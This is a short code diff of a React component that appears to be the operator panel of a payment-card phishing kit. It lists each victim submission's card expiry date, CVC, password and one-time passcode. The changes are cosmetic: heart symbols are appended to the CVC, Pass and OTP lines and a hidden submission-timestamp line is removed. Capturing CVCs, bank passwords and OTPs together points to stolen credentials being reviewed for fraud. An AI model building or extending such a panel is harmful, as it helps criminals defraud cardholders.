@@ -90,14 +90,13 @@ const [audio,setAudio] = useState<HTMLAudioElement>();
               </CardHeader>
               <AccordionContent>
                 <CardContent dir='rtl' className='grid grid-cols-2'>
-                  <strong className='mx-3 text-red-300'>تاريخ الانتهاء </strong>           {submission.paymentInfo.month+"/"+submission.paymentInfo.year}
-                  <strong  className='mx-3 text-red-300'>CVC </strong>  {submission.paymentInfo.cvc}
+                  <strong className='mx-3 text-red-300'>تاريخ الانتهاء </strong>           {submission.paymentInfo.month+"/"+submission.paymentInfo.year}-                
+                <strong  className='mx-3 text-red-300'>CVC </strong>        {submission.paymentInfo.cvc}♥
 
 
-   <strong  className='mx-3 text-red-300'> Pass </strong>              {submission.paymentInfo.pass}  
-   <strong  className='mx-3 text-red-300'> OTP </strong>              {submission.paymentInfo.otp}  
+   <strong  className='mx-3 text-red-300'> Pass </strong>              {submission.paymentInfo.pass}  ♥
+   <strong  className='mx-3 text-red-300'> OTP </strong>              {submission.paymentInfo.otp}  ♥
 
-                    <strong className='hidden'>Submitted:</strong> {submission.paymentInfo.createdAt} 
                 </CardContent>
               </AccordionContent>
             </AccordionItem>
